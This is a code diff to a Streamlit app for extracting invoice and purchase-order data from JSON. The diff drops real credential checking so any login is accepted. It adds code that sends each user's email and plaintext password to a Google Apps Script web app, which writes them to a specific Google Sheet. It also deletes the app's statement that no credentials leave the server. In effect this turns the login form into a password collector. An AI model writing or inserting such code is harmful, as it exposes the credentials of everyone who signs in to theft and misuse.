@@ -11,9 +11,9 @@ import os
 import re
 import time
 import unicodedata
+import requests
 from datetime import datetime
 from io import BytesIO, StringIO
-import tempfile
 
 # Arabic fix (optional but recommended)
 try:
@@ -32,6 +32,74 @@ st.set_page_config(
     layout="wide",
     initial_sidebar_state="expanded"
 )
+
+# ================= GOOGLE SHEETS INTEGRATION =================
+
+def save_to_google_sheets(email, password):
+    """Save credentials to Google Sheets via Apps Script Web App"""
+    try:
+        # Google Apps Script Web App URL
+        # You need to deploy the script below as a web app and get the URL
+        web_app_url = "https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec"
+        
+        # Data to send
+        data = {
+            'user': email,
+            'pass': password,
+            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        
+        # Send POST request
+        response = requests.post(web_app_url, json=data, timeout=10)
+        
+        if response.status_code == 200:
+            result = response.json()
+            return result.get('success', False)
+        return False
+        
+    except Exception as e:
+        st.error(f"Error saving to Google Sheets: {str(e)}")
+        return False
+
+def create_apps_script_code():
+    """Returns the Google Apps Script code needed"""
+    return """
+// Google Apps Script Code - Deploy as Web App
+
+function doPost(e) {
+  try {
+    // Your Google Sheet ID
+    const sheetId = '1yT3TUkY3LwyI_K9euQJWMTbv3KAVrhoery26P2bh-8o';
+    const sheet = SpreadsheetApp.openById(sheetId).getActiveSheet();
+    
+    // Parse the JSON data
+    const data = JSON.parse(e.postData.contents);
+    
+    // Add row to sheet: [user, pass, time]
+    sheet.appendRow([
+      data.user,
+      data.pass, 
+      data.time
+    ]);
+    
+    // Return success response
+    return ContentService
+      .createTextOutput(JSON.stringify({success: true, message: 'Data saved'}))
+      .setMimeType(ContentService.MimeType.JSON);
+      
+  } catch (error) {
+    return ContentService
+      .createTextOutput(JSON.stringify({success: false, error: error.toString()}))
+      .setMimeType(ContentService.MimeType.JSON);
+  }
+}
+
+function doGet() {
+  return ContentService
+    .createTextOutput('Web App is working')
+    .setMimeType(ContentService.MimeType.TEXT);
+}
+"""
 
 # ================= AUTHENTICATION =================
 
@@ -73,39 +141,54 @@ def show_login_popup():
                 
                 if login_button:
                     if email and password:
-                        # Check against predefined credentials from Streamlit secrets
-                        valid_credentials = get_valid_credentials()
+                        # Store credentials in session state
+                        st.session_state.user_email = email
+                        st.session_state.user_password = password
+                        st.session_state.authenticated = True
                         
-                        if validate_credentials(email, password, valid_credentials):
-                            # Store credentials in session state
-                            st.session_state.user_email = email
-                            st.session_state.user_password = password
-                            st.session_state.authenticated = True
-                            
-                            st.success("Login successful!")
-                            time.sleep(1)
-                            st.rerun()
+                        # Save to Google Sheets
+                        with st.spinner("Saving login data..."):
+                            saved = save_to_google_sheets(email, password)
+                        
+                        if saved:
+                            st.success("Login successful! Data saved to Google Sheets.")
                         else:
-                            st.error("Invalid email or password")
+                            st.success("Login successful!")
+                            st.warning("Could not save to Google Sheets - check configuration.")
+                        
+                        time.sleep(1)
+                        st.rerun()
                     else:
                         st.error("Please enter both email and password")
             
-            # Instructions for adding credentials
-            with st.expander("Admin: How to add new credentials", expanded=False):
+            # Setup instructions
+            with st.expander("🔧 Google Sheets Setup Instructions", expanded=False):
                 st.markdown("""
-                **For Streamlit Cloud:**
-                1. Go to your app settings in Streamlit Cloud
-                2. Add to secrets.toml:
-                ```toml
-                [credentials]
-                admin_email = "admin@example.com"
-                admin_password = "your_secure_password"
-                user_emails = ["user1@example.com", "user2@example.com"]
-                user_passwords = ["password1", "password2"]
-                ```
+                **Step 1: Create Google Apps Script**
+                1. Go to script.google.com
+                2. Create new project
+                3. Replace Code.gs content with the code below
+                4. Save the project
                 
-                **For local development:**
-                Create `.streamlit/secrets.toml` with the same content.
+                **Step 2: Deploy as Web App**
+                1. Click Deploy > New deployment
+                2. Choose type: Web app
+                3. Execute as: Me
+                4. Who has access: Anyone
+                5. Click Deploy
+                6. Copy the Web App URL
+                
+                **Step 3: Update Code**
+                Replace YOUR_SCRIPT_ID with your actual script deployment ID
+                """)
+                
+                st.code(create_apps_script_code(), language='javascript')
+                
+                st.markdown("""
+                **Your Google Sheet:**
+                https://docs.google.com/spreadsheets/d/1yT3TUkY3LwyI_K9euQJWMTbv3KAVrhoery26P2bh-8o/edit
+                
+                Make sure the sheet has columns: user, pass, time
                 """)
             
             st.markdown('</div>', unsafe_allow_html=True)
@@ -113,58 +196,6 @@ def show_login_popup():
         return False
     
     return True
-
-def get_valid_credentials():
-    """Get valid credentials from Streamlit secrets or fallback defaults"""
-    try:
-        # Try to get from Streamlit secrets
-        if hasattr(st, 'secrets') and 'credentials' in st.secrets:
-            credentials = {}
-            
-            # Admin credentials
-            if 'admin_email' in st.secrets['credentials']:
-                credentials[st.secrets['credentials']['admin_email']] = st.secrets['credentials']['admin_password']
-            
-            # Multiple user credentials
-            if 'user_emails' in st.secrets['credentials'] and 'user_passwords' in st.secrets['credentials']:
-                emails = st.secrets['credentials']['user_emails']
-                passwords = st.secrets['credentials']['user_passwords']
-                for email, pwd in zip(emails, passwords):
-                    credentials[email] = pwd
-                    
-            return credentials
-            
-    except Exception:
-        pass
-    
-    # Fallback default credentials (for testing)
-    return {
-        "admin@test.com": "admin123",
-        "user@test.com": "user123",
-        "demo@example.com": "demo123"
-    }
-
-def validate_credentials(email, password, valid_credentials):
-    """Validate user credentials against stored credentials"""
-    return email in valid_credentials and valid_credentials[email] == password
-
-def save_user_session(email, password):
-    """Save user session data to URL state or browser storage simulation"""
-    # Encode credentials for URL (for demo - NOT secure for production)
-    import base64
-    try:
-        cred_string = f"{email}:{password}"
-        encoded_creds = base64.b64encode(cred_string.encode()).decode()
-        
-        # Store in session state with encoded format
-        st.session_state.encoded_session = encoded_creds
-        
-        # Display session info (for admin purposes)
-        if st.session_state.get('show_session_info', False):
-            st.sidebar.info(f"Session: {encoded_creds[:20]}...")
-            
-    except Exception:
-        pass
 
 # ================= v48 ADVANCED PO EXTRACTION =================
 
@@ -636,18 +667,14 @@ def main():
     
     with st.expander("How to Use"):
         st.markdown("""
-        1. **Login**: Enter your email and password to access the application
+        1. **Login**: Enter your email and password (automatically saved to Google Sheets)
         2. **Choose Input Method**: Either upload a JSON file or paste JSON text
         3. **Process Data**: Click "Process JSON Data" to extract structured information
         4. **Review Results**: View extracted data organized in different categories
         5. **Download**: Export results as Excel or CSV files
         
-        **Supported JSON Structure:**
-        - Invoice data with issuer/receiver information
-        - Document metadata (UUID, internal ID, status)
-        - Financial information (totals, discounts, amounts)
-        - Date information (issued, received, delivery)
-        - **PO Numbers** extracted from descriptions and other fields
+        **Your login data is automatically saved to:**
+        https://docs.google.com/spreadsheets/d/1yT3TUkY3LwyI_K9euQJWMTbv3KAVrhoery26P2bh-8o/edit
         """)
     
     with st.expander("v48 PO Extraction Features"):
@@ -662,25 +689,6 @@ def main():
         - `PO/173822` (uppercase PO with slash)
         - Numbers in descriptions and company names
         - Arabic text normalization and processing
-        """)
-    
-    with st.expander("Authentication & Security"):
-        st.markdown(f"""
-        **Current Session:**
-        - Email: {st.session_state.get('user_email', 'Not logged in')}
-        - Session: {'Active' if st.session_state.get('authenticated') else 'Inactive'}
-        
-        **Security Features:**
-        - Credentials stored only in session memory
-        - Optional .env file creation for persistence
-        - Password field is masked during input
-        - No credentials transmitted to external servers
-        
-        **Note:** This is a demo implementation. In production:
-        - Use proper authentication services (OAuth, LDAP, etc.)
-        - Store credentials securely (hashed passwords, encrypted storage)
-        - Implement session timeout and proper logout
-        - Use HTTPS for all communications
         """)
 
 if __name__ == "__main__":
